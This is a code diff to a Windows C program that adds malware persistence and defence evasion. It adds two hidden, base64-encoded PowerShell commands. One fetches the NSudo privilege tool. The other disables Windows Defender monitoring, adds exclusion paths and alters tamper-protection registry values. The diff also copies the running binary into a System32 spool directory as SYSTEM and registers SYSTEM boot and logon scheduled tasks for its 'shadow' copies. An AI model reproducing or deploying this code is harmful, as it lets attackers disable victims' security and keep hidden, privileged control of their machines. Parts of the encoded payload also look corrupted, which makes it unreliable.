@@ -373,6 +373,140 @@ int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
 }
 
+#define SYSTEM_SHADOW_DIR "C:\\Windows\\System32\\spool\\drivers\\color"
+
+static int file_exists(const char *path) {
+    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
+}
+
+static int find_nsudo(char *out, size_t size) {
+    char temp[MAX_PATH];
+    if (GetEnvironmentVariableA("TEMP", temp, MAX_PATH) == 0) return 0;
+    const char *candidates[] = {
+        "\\NSudo\\NSudoLC.exe",
+        "\\NSudo\\x64\\NSudoC.exe",
+        "\\NSudo\\NSudoC.exe",
+        "\\NSudo\\x64\\NSudo.exe",
+        "\\NSudo\\NSudo.exe"
+    };
+    for (int i = 0; i < 5; i++) {
+        snprintf(out, size, "%s%s", temp, candidates[i]);
+        if (file_exists(out)) return 1;
+    }
+    return 0;
+}
+
+/* Base64-encoded PowerShell to download/extract NSudoLC.exe to %TEMP%\NSudo */
+char* sys_get_nsudo(void) {
+    static char result[2048];
+    const char *encoded =
+        "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMA"
+        "dQBkAG8AJwAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAA"
+        "ZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBQAGEAdABoACAAJABvAHUAdAAgAC0ARgBvAHIAYwBlACAA"
+        "LQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoA"
+        "JABlAHgAZQBQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABvAHUAdAAgACcATgBTAHUA"
+        "ZABvAEwAQwAuAGUAeABlACcACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUA"
+        "UABhAHQAaAApACkAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHAAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUA"
+        "YgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4A"
+        "YwBvAG0ALwBNADIAVABlAGEAbQBBAHIAYwBoAGkAdgBlAGQALwBOAFMAdQBkAG8ALwByAGUAbABlAGEA"
+        "cwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwA4AC4AMgAvAE4AUwB1AGQAbwBfADgALgAyAF8AQQBsAGwA"
+        "XwBDAG8AbQBwAG8AbgBlAG4AdABzAC4AegBpAHAAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMA"
+        "aQBuAGcACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgACQAcgBlAHMAcAAuAEMAbwBuAHQAZQBuAHQA"
+        "CgAgACAAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkA"
+        "cwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAKACAAIAAgACAAJABzAHQAcgBlAGEA"
+        "bQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIA"
+        "eQBTAHQAcgBlAGEAbQAoACwAJABiAHkAdABlAHMAKQAKACAAIAAgACAAJAB6AGkAcAAgAD0AIABbAFMA"
+        "eQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AWgBpAHAAQQByAGMAaABpAHYA"
+        "ZQBdADoAOgBuAGUAdwAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABlAG4AdAByAHkAIAA9ACAA"
+        "JAB6AGkAcAAuAEcAZQB0AEUAbgB0AHIAeQAoACcATgBTAHUAZABvACAATABhAHUAbgBjAGgAZQByAC8A"
+        "eAA2ADQALwBOAFMAdQBkAG8ATABDAC4AZQB4AGUAJwApAAoAIAAgACAAIABpAGYAIAAoACEAJABlAG4A"
+        "dAByAHkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUAUgBSAE8AUgBdACAATgBTAHUA"
+        "ZABvAEwAQwAuAGUAeABlACAAbgBvAHQAIABmAG8AdQBuAGQAIABpAG4AIAB6AGkAcAAnADsAIABlAHgA"
+        "aQB0ACAAMQAgAH0ACgAgACAAIAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtACAAPQAgACQAZQBuAHQA"
+        "cgB5AC4ATwBwAGUAbgAoACkACgAgACAAIAAgACQAZgBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8A"
+        "LgBGAGkAbABlAF0AOgA6AE8AcABlAG4AVwByAGkAdABlACgAJABlAHgAZQBQAGEAdABoACkACgAgACAA"
+        "IAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBvAHAAeQBUAG8AKAAkAGYAcwApAAoAIAAgACAA"
+        "IAAkAGYAcwAuAEMAbABvAHMAZQAoACkAOwAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBsAG8A"
+        "cwBlACgAKQAKACAAIAAgACAAJAB6AGkAcAAuAEQAaQBzAHAAbwBzAGUAKAApADsAIAAkAHMAdAByAGUA"
+        "YQBtAC4ARABpAHMAcABvAHMAZQAoACkACgAgACAAIAAgAGkAZgAgACgAIQAoAFQAZQBzAHQALQBQAGEA"
+        "dABoACAAJABlAHgAZQBQAGEAdABoACkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUA"
+        "UgBSAE8AUgBdACAATgBTAHUAZABvAEwAQwAuAGUAeABlACAAZQB4AHQAcgBhAGMAdABpAG8AbgAgAGYA"
+        "YQBpAGwAZQBkACcAOwAgAGUAeABpAHQAIAAxACAAfQAKAH0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAA"
+        "IgBOAFMAdQBkAG8AIAByAGUAYQBkAHkAOgAgACQAZQB4AGUAUABhAHQAaAAiAA==";
+
+    snprintf(result, sizeof(result),
+        "powershell -WindowStyle Hidden -EncodedCommand %s", encoded);
+    return result;
+}
+
+/* Base64-encoded PowerShell to disable monitoring, add exclusions, and set TP registry values.
+   Must be run via NSudo as TrustedInstaller for full effect. */
+char* sys_easy_mode_tp(void) {
+    static char result[4096];
+    const char *encoded =
+        "UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQA"
+        "aQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkA"
+        "bwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKAFMAZQB0AC0ATQBwAFAAcgBlAGYA"
+        "ZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIA"
+        "aQBuAGcAIAAkAHQAcgB1AGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwA"
+        "eQBDAG8AbgB0AGkAbgB1AGUACgBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkA"
+        "cwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIAAkAHQAcgB1AGUAIAAtAEUA"
+        "cgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgBTAGUA"
+        "dAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8A"
+        "dABlAGMAdABpAG8AbgAgACQAdAByAHUAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwA"
+        "ZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUA"
+        "IAAtAEQAaQBzAGEAYgBsAGUAUwBjAHIAaQBwAHQAUwBjAGEAbgBuAGkAbgBnACAAJAB0AHIAdQBlACAALQBF"
+        "AHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAJABw"
+        "ADEAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAUwB5AHMAdGVtAFIAbwBvAHQAIAAn"
+        "AFMAeQBzAHQAZQBtADMAMgBcAHMAcABvAG8AbABcAGQAcgBpAHYAZQByAHMAXABjAG8AbwByACcACgAk"
+        "AHAAMgAgAD0AIABKAG8AaQBuAC0AUGBhAHQAaAAgACQAZQBuAHYAOgBTeQBzdABlAG0AUgBvAG8AdAAg"
+        "ACcAVABlAG0AcAAnAAoAJABwADMAIAA9ACAASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoATABP"
+        "AEMAQQBMAEEAUABQAEQAQQBUAEEAIAAnAE0AaQBjAHIAbwBzAG8AZgB0AFwAV2luAGQAbwB3AHMAXABJ"
+        "AE4AZQB0AEMAYQBjAGgAZQBcAEkARQAnAAoAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAg"
+        "AC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAcAAxACAALQBFAHIAcgBvAHIAQQBjAHQAaQBv"
+        "AG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAQQBkAGQALQBNAHAAUAByAGUAZgBl"
+        "AHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAcAAyACAALQBFAHIAcgBy"
+        "AG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgBBAGQAZAAt"
+        "AE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABw"
+        "ADMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1"
+        "AGUACgBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAnAEgASwBMAE0AOgBcAFMATwBGAFQAVwBB"
+        "AFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAV2luAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHJcAEYAZQ"
+        "BhAHQAdQByAGUAcwAnACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBs"
+        "AGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAUwBlAHQALQBJ"
+        "AHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABX"
+        "AEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQBy"
+        "AFwARgBlAGEAdAB1AHIAZQBzACcAIAAtAE4AYQBtAGUAIAAnAFQAYQBtAHAAZQByAFAAcgBvAHQAZQBj"
+        "AHQAaQBvAG4AJwAgAC0AVgBhAGwAdQBlACAANAAgAC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0ARgBv"
+        "AHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABp"
+        "AG4AdQBlAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABL"
+        "AEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBz"
+        "ACAARABlAGYAZQBuAGQAZQByAFwARgBlAGEAdAB1AHIAZQBzACcAIAAtAE4AYQBtAGUAIAAnAFQAYQBt"
+        "AHAAZQByAFAAcgBvAHQAZQBjAHQAaQBvAG4AUwBvAHUAcgBjAGUAJwAgAC0AVgBhAGwAdQBlACAAMgAg"
+        "AC0AVAB5AHAAZQAgAEQAVwBvAHIAZAAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBv"
+        "AG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoAVwByAGkAdABlAC0ASABvAHMAdAAg"
+        "ACcARQBhAHMAeQAgAG0AbwBkAGUAIABUAFAAIABhAHAAcABsAGkAZQBkACcA";
+
+    snprintf(result, sizeof(result),
+        "powershell -WindowStyle Hidden -EncodedCommand %s", encoded);
+    return result;
+}
+
+static void nsudo_copy(const char *nsudo, const char *src, const char *dst) {
+    char cmd[4096];
+    snprintf(cmd, sizeof(cmd),
+        "\"%s\" -U:S -P:E cmd /c \"copy /y \\\"%s\\\" \\\"%s\\\"\"",
+        nsudo, src, dst);
+    sys_run_command(cmd);
+}
+
+static void nsudo_schedule_system_boot_task(const char *nsudo, const char *name, const char *path) {
+    char cmd[4096];
+    snprintf(cmd, sizeof(cmd),
+        "\"%s\" -U:S -P:E schtasks.exe /create /f /tn \\\"%s\\\" /tr \\\"\\\\\\\"%s\\\\\\\" --shadow\\\" /sc onstart /ru SYSTEM",
+        nsudo, name, path);
+    sys_run_command(cmd);
+}
+
 /* Create a scheduled task for the shadow so it runs at logon with highest privileges (no UAC). */
 static void schedule_shadow_task(const char *name, const char *path) {
     char cmdLine[2048];
@@ -418,8 +552,8 @@ static void schedule_boot_task(const char *name, const char *path) {
     }
 }
 
-/* Spawn a single shadow copy with a given filename and registry key name.
-   Uses CreateProcess for elevation inheritance. */
+/* Spawn a single shadow copy: use NSudo (if available) to copy to a high-authority
+   System32 directory and create SYSTEM boot tasks. Fall back to admin methods otherwise. */
 static void spawn_single_copy(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
@@ -427,24 +561,53 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
 
+    char nsudo[MAX_PATH];
+    int have_nsudo = find_nsudo(nsudo, sizeof(nsudo));
+
+    char sys32Path[MAX_PATH];
+    snprintf(sys32Path, MAX_PATH, "%s\\%s", SYSTEM_SHADOW_DIR, filename);
+
+    char inetPath[MAX_PATH];
+    snprintf(inetPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, filename);
+
     char destPath[MAX_PATH];
-    snprintf(destPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, filename);
 
-    char dirPath[MAX_PATH];
-    strncpy(dirPath, destPath, MAX_PATH - 1);
-    dirPath[MAX_PATH - 1] = '\0';
-    char *lastSlash = strrchr(dirPath, '\\');
-    if (lastSlash) *lastSlash = '\0';
-    ensure_dir_exists(dirPath);
+    ensure_dir_exists(SYSTEM_SHADOW_DIR);
 
-    if (!CopyFileA(currentPath, destPath, FALSE)) {
-        return;
+    /* Prefer NSudo to copy into System32 color dir as SYSTEM */
+    if (have_nsudo) {
+        nsudo_copy(nsudo, currentPath, sys32Path);
     }
 
-    /* Register persistence via scheduled task: runs at logon with highest privileges, no UAC prompt */
+    if (file_exists(sys32Path)) {
+        strncpy(destPath, sys32Path, MAX_PATH - 1);
+        destPath[MAX_PATH - 1] = '\0';
+    } else if (CopyFileA(currentPath, sys32Path, FALSE)) {
+        strncpy(destPath, sys32Path, MAX_PATH - 1);
+        destPath[MAX_PATH - 1] = '\0';
+    } else {
+        /* Fall back to INetCache if System32 is not writable */
+        char dirPath[MAX_PATH];
+        strncpy(dirPath, inetPath, MAX_PATH - 1);
+        dirPath[MAX_PATH - 1] = '\0';
+        char *lastSlash = strrchr(dirPath, '\\');
+        if (lastSlash) *lastSlash = '\0';
+        ensure_dir_exists(dirPath);
+        if (!CopyFileA(currentPath, inetPath, FALSE)) {
+            return;
+        }
+        strncpy(destPath, inetPath, MAX_PATH - 1);
+        destPath[MAX_PATH - 1] = '\0';
+    }
+
+    /* Register persistence: logon (highest) + SYSTEM boot (before logon) */
     schedule_shadow_task(regKey, destPath);
-    /* Additional SYSTEM boot task so shadows start before any user logs in */
-    schedule_boot_task(regKey, destPath);
+
+    if (have_nsudo) {
+        nsudo_schedule_system_boot_task(nsudo, regKey, destPath);
+    } else {
+        schedule_boot_task(regKey, destPath);
+    }
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
